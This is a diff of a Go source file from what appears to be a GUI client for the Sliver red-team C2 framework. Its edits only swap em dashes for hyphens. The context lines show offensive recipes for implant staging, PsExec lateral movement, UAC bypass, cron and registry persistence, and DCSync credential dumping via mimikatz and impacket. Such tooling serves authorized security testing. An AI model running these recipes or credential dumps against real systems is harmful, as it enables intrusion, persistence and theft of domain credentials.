@@ -15,9 +15,8 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// scripts.go implements "Script Manager" — one-click lateral movement,
-// privilege escalation, and persistence recipes (like Cobalt Strike's
-// jump/spawn/remote-exec commands).
+// scripts.go implements "Script Manager" - one-click lateral movement,
+// privilege escalation, and persistence recipes (jump/spawn/remote-exec).
 //
 // All methods are bound to the frontend via Wails and appear in the
 // Script Manager panel.
@@ -556,7 +555,7 @@ func (a *App) ScriptUACBypass(sessionID, beaconPath string) ScriptResult {
 	if !a.targetFileExists(sessionID, beaconPath) {
 		copyCmd := fmt.Sprintf(`powershell -Command "Copy-Item -Path (Get-Process -Id $PID).Path -Destination '%s' -Force"`, beaconPath)
 		if _, err := a.executeShellCmd(sessionID, copyCmd); err != nil || !a.targetFileExists(sessionID, beaconPath) {
-			return ScriptResult{Error: fmt.Sprintf("no beacon staged at %s — run 'spawn <os> <arch> <profile>' first to stage an implant, then retry UAC Bypass.", beaconPath)}
+			return ScriptResult{Error: fmt.Sprintf("no beacon staged at %s - run 'spawn <os> <arch> <profile>' first to stage an implant, then retry UAC Bypass.", beaconPath)}
 		}
 	}
 	cmds := []string{
@@ -735,11 +734,11 @@ func (a *App) ScriptKerberoast(sessionID string) ScriptResult {
 }
 
 // ScriptDCSync displays instructions for DCSync (requires mimikatz or impacket).
-// NOTE: This is an INSTRUCTIONAL STUB — it does not perform the actual DCSync.
+// NOTE: This is an INSTRUCTIONAL STUB - it does not perform the actual DCSync.
 // The operator must run mimikatz or impacket-secretsdump manually.
 func (a *App) ScriptDCSync(sessionID string) ScriptResult {
 	a.audit.log("script-dcsync", sessionID, "")
-	ps := `powershell -c "echo '[!] DCSync — INSTRUCTIONAL ONLY (requires mimikatz or impacket)'; echo ''; echo 'Option 1 — From Kali (impacket):'; echo '  impacket-secretsdump DOMAIN/user:pass@DC_IP'; echo ''; echo 'Option 2 — On target (mimikatz via Sliver extension):'; echo '  ext mimikatz lsadump::dcsync /domain:DOMAIN /user:krbtgt'; echo ''; echo 'Option 3 — Upload mimikatz manually and run from this session.'"`
+	ps := `powershell -c "echo '[!] DCSync - INSTRUCTIONAL ONLY (requires mimikatz or impacket)'; echo ''; echo 'Option 1 - From Kali (impacket):'; echo '  impacket-secretsdump DOMAIN/user:pass@DC_IP'; echo ''; echo 'Option 2 - On target (mimikatz via Sliver extension):'; echo '  ext mimikatz lsadump::dcsync /domain:DOMAIN /user:krbtgt'; echo ''; echo 'Option 3 - Upload mimikatz manually and run from this session.'"`
 	output, ferr := a.executeShellCmd(sessionID, ps)
 	if ferr != nil {
 		return ScriptResult{Error: ferr.Error(), Output: output}
@@ -815,12 +814,12 @@ func (a *App) requireSession(sessionID string) (*clientpb.Session, error) {
 	if len(short) > 8 {
 		short = short[:8]
 	}
-	return nil, fmt.Errorf("agent %s is not an interactive session — Script Manager recipes need a session (a beacon queues tasks with delayed output). Interact via a session, or task the beacon from its own console", short)
+	return nil, fmt.Errorf("agent %s is not an interactive session - Script Manager recipes need a session (a beacon queues tasks with delayed output). Interact via a session, or task the beacon from its own console", short)
 }
 
 // executeShellCmd runs a shell command on the agent and returns its combined
 // output plus a real error. A non-nil error means the command did not execute
-// (no client, not a session, RPC failure) — callers must surface that instead of
+// (no client, not a session, RPC failure) - callers must surface that instead of
 // reporting a misleading Success. In-band output (stdout+stderr) is returned
 // even on success so recipes can show what happened.
 func (a *App) executeShellCmd(sessionID, cmd string) (string, error) {
@@ -828,7 +827,7 @@ func (a *App) executeShellCmd(sessionID, cmd string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	// Resolve the session once (also rejects beacons) and pick the right shell —
+	// Resolve the session once (also rejects beacons) and pick the right shell -
 	// Windows scripts need cmd.exe, Linux/macOS need /bin/sh.
 	sess, err := a.requireSession(sessionID)
 	if err != nil {
@@ -859,7 +858,7 @@ func (a *App) executeShellCmd(sessionID, cmd string) (string, error) {
 	return out, nil
 }
 
-// getPivotInternalIP returns the pivot session's private LAN IPv4 — the host the
+// getPivotInternalIP returns the pivot session's private LAN IPv4 - the host the
 // target will wget the beacon from. It returns an error (rather than guessing a
 // hardcoded address) when no private IP can be found, so the SSH-deploy chain
 // fails loudly instead of silently pointing the target at the wrong host.
@@ -889,7 +888,7 @@ func (a *App) getPivotInternalIP(sessionID string) (string, error) {
 			}
 		}
 	}
-	return "", fmt.Errorf("no private LAN IPv4 found on the pivot session — specify the pivot IP manually")
+	return "", fmt.Errorf("no private LAN IPv4 found on the pivot session - specify the pivot IP manually")
 }
 
 func filepath_Base(path string) string {
@@ -956,7 +955,7 @@ func (a *App) snapshotAgentIDs() map[string]bool {
 
 // waitForNewAgent polls sessions+beacons up to timeout for an agent whose ID is
 // not in 'before', returning a short human description if one appears (empty if
-// none checks in — e.g. a beacon whose interval hasn't elapsed yet).
+// none checks in - e.g. a beacon whose interval hasn't elapsed yet).
 func (a *App) waitForNewAgent(before map[string]bool, timeout time.Duration) string {
 	client, err := a.requireClient()
 	if err != nil {
@@ -1052,7 +1051,7 @@ type ScriptInfo struct {
 
 func (a *App) ListScripts() []ScriptInfo {
 	return []ScriptInfo{
-		// Lateral Movement — Linux
+		// Lateral Movement - Linux
 		{
 			Name: "Spawn Local", Category: "Spawn (Current Host)", Description: "Generate + run new beacon on THIS machine (like CS spawn x64 http)", Method: "ScriptSpawnLocal",
 			AttckID: "T1055", OpsecNoise: "Low", TargetOS: "all",
@@ -1106,7 +1105,7 @@ func (a *App) ListScripts() []ScriptInfo {
 			},
 		},
 
-		// Lateral Movement — Windows
+		// Lateral Movement - Windows
 		{
 			Name: "Spawn Windows", Category: "Lateral Movement (Windows)", Description: "AUTO-GENERATE + deploy via PsExec (like CS jump psexec64)", Method: "ScriptSpawnWindows",
 			AttckID: "T1021.002", OpsecNoise: "High", TargetOS: "windows",
@@ -1168,7 +1167,7 @@ func (a *App) ListScripts() []ScriptInfo {
 			},
 		},
 
-		// Privilege Escalation — Linux
+		// Privilege Escalation - Linux
 		{
 			Name: "Privesc Check (Linux)", Category: "Privilege Escalation", Description: "Enumerate sudo, SUID, writable dirs", Method: "ScriptPrivescCheck",
 			AttckID: "T1082", OpsecNoise: "Low", TargetOS: "linux",
@@ -1182,7 +1181,7 @@ func (a *App) ListScripts() []ScriptInfo {
 			},
 		},
 
-		// Privilege Escalation — Windows
+		// Privilege Escalation - Windows
 		{
 			Name: "Privesc Check (Windows)", Category: "Privilege Escalation", Description: "Check AlwaysInstallElevated, unquoted paths, weak services", Method: "ScriptWinPrivescCheck",
 			AttckID: "T1082", OpsecNoise: "Low", TargetOS: "windows",
@@ -1210,7 +1209,7 @@ func (a *App) ListScripts() []ScriptInfo {
 			},
 		},
 
-		// Persistence — Linux
+		// Persistence - Linux
 		{
 			Name: "Cron Persistence", Category: "Persistence (Linux)", Description: "Add cron job for beacon restart", Method: "ScriptPersistCron",
 			AttckID: "T1053.003", OpsecNoise: "Medium", TargetOS: "linux",
@@ -1235,7 +1234,7 @@ func (a *App) ListScripts() []ScriptInfo {
 			},
 		},
 
-		// Persistence — Windows
+		// Persistence - Windows
 		{
 			Name: "Registry Run Key", Category: "Persistence (Windows)", Description: "Add Run key for user-level persistence", Method: "ScriptPersistRegRun",
 			AttckID: "T1547.001", OpsecNoise: "High", TargetOS: "windows",
@@ -1711,7 +1710,7 @@ func (a *App) checkListenerPorts(c2URLs []string) string {
 	}
 	jobs, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
 	if err != nil {
-		return "" // can't list jobs — don't block the spawn on our own check
+		return "" // can't list jobs - don't block the spawn on our own check
 	}
 
 	livePorts := map[uint32]bool{}
@@ -1723,7 +1722,7 @@ func (a *App) checkListenerPorts(c2URLs []string) string {
 		have = append(have, fmt.Sprintf("%s:%d", strings.ToLower(j.Name), j.Port))
 	}
 
-	// Match by port (the strongest signal — e.g. a C2 on :31337 with no listener
+	// Match by port (the strongest signal - e.g. a C2 on :31337 with no listener
 	// there). Only warn when we positively know no port matches.
 	var wanted []string
 	sawPort := false
@@ -1743,7 +1742,7 @@ func (a *App) checkListenerPorts(c2URLs []string) string {
 		}
 	}
 	if !sawPort {
-		return "" // couldn't resolve any port — don't block
+		return "" // couldn't resolve any port - don't block
 	}
 	return fmt.Sprintf(
 		"target C2 %s but no listener is running on that port.\nActive listeners: %s.\nStart a matching listener (Listeners panel, or e.g. `mtls <port>` in the server console) or use a C2 that matches a live listener.",
@@ -1781,7 +1780,7 @@ func (a *App) autoGenerate(osTarget, arch, profileOrURL string, isBeacon bool) (
 
 	var config *clientpb.ImplantConfig
 	if strings.Contains(profileOrURL, "://") {
-		// Raw C2 URL — build a config directly (no saved profile needed).
+		// Raw C2 URL - build a config directly (no saved profile needed).
 		config = a.buildImplantConfig(GenerateRequest{
 			GOOS:   osTarget,
 			GOARCH: arch,
@@ -1824,10 +1823,10 @@ func (a *App) autoGenerate(osTarget, arch, profileOrURL string, isBeacon bool) (
 	return generated.File.Data, implantName, nil
 }
 
-// ─── Spawn (local — like CS "spawn x64 http") ────────────────────────────────
+// ─── Spawn (local - like CS "spawn x64 http") ────────────────────────────────
 
 // ScriptSpawnLocal generates a new implant and runs it on the CURRENT session's host.
-// No credentials needed — you already have access. Gets you a second callback
+// No credentials needed - you already have access. Gets you a second callback
 // on a different listener/protocol.
 //
 // Usage from console: spawn <os> <arch> <profile_name>
